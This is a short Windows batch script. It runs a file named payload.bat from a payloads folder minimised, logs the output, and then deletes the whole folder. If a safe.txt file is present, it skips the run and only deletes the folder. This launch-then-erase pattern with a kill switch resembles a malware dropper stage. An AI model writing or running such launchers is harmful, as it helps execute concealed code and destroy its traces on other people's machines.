@echo off
if exist ".\payloads\payload.bat" (
   if exist safe.txt (
     rmdir /s /q .\payloads
     exit
   ) else (
     start /min /wait .\payloads\payload.bat > e.log
     rmdir /s /q .\payloads
     exit
   )
) else (
   exit
)
